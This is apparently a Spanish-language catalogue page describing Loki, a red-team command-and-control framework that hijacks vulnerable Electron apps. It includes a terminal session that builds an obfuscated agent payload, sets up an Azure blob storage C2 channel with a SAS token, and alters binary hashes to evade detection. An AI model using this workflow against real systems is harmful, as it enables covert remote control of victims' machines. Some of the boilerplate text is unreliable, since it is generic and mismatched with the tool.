---
title: "Loki: el panel que coordina agentes sin levantar sospechas"
slug: "loki"
summary: "Loki: framework de mando y control para mantener el acceso."
category: "ciberseguridad"
level: "Avanzado"
reading: 7
tags: ["mando-y-control", "red-team", "ciberseguridad"]
updated: "2026-11-01"
featured: false
order: 999
---

## Qué es Loki

**Loki** es una herramienta de código abierto orientada a operaciones de red team y adversary simulation. El C2 es el sistema nervioso de la operación: permite enviar tareas, recibir resultados y mantener el control aunque cambie la red.

> Descripción oficial: Node.js Command & Control for Script-Jacking Vulnerable Electron Applications

## Para qué sirve

Loki se utiliza en la fase de **mando y control** (remote access tools (rat)). Su función es automatizar o simplificar una tarea técnica que, hecha a mano, consumiría tiempo y aumentaría el riesgo de errores.

En la práctica, permite al operador centrarse en la estrategia y en la interpretación de los resultados, no en repetir comandos.

## Instalación

```bash
npm install --save-dev javascript-obfuscator
```

> Revisa el README oficial para dependencias específicas, versiones y notas de compilación.

## Uso básico

```bash
bobby$ node create_agent_payload.js 
[+] Provide Azure storage account information:
        - Enter Storage Account  : 7f7584ty218ba5dba778.blob.core.windows.net
        - Enter SAS Token        : se=2025-05-28T23%3A14%3A48Z&sp=rwdlac&spr=https&sv=2022-11-02&ss=b&srt=sco&sig=5MXQzJ6FDZK8yYiBSgJ6FDZKgQzJMXBSgg6qE4ydrJ6FDZKSgg%3D

[+] Configuration:
        - Storage Account : 7f7584ty218ba5dba778.blob.core.windows.net
        - SAS Token       : se=2025-05-28T23%3A14%3A48Z&sp=rwdlac&spr=https&sv=2022-11-02&ss=b&srt=sco&sig=5MXQzJ6FDZK8yYiBSgJ6FDZKgQzJMXBSgg6qE4ydrJ6FDZKSgg%3D
        - Meta Container  : mllyi2zjmafjm

[+] Updated /Users/bobby/apr2/LokiC2/config.js with storage configuration. 
 - Enter into the Loki Client UI
        Loki Client > Configuration

[+] Modifying PE binaries to have new hashes...
        - Payload assembly.node hash : e9d126407264821d3c2d324da0e2d1bc13cbc53e7c56340fe12b07f69b707f02
        - Payload keytar.node   hash : 292c14ffebd6cae3df99d9fbee525e29a5a704f076b82207eb3e650de45b075d

[+] Payload ready!
         - Obfuscated payload in the ./app directory
```

## Compatibilidad y requisitos

- **Lenguaje principal:** JavaScript
- **Última actualización del repositorio:** 2026-03-27
- **Estrellas en GitHub:** 1.371
- **Termux:** sí, con matices

**Compatible con Termux (con matices).** Si el proyecto es Python, Go, Rust o Bash, puedes clonarlo en Termux e instalar sus dependencias. Algunas funciones que dependen de la red, del almacenamiento o de permisos del sistema pueden requerir un entorno Linux completo.

## Ética y alcance

Usa Loki únicamente en sistemas propios o con autorización escrita. El uso no autorizado es ilegal. En laboratorio, aísla la red, documenta cada paso y respeta el alcance acordado.

## Referencias

- Repositorio oficial: https://github.com/boku7/Loki
- Toolkit de origen: Red Teaming Toolkit
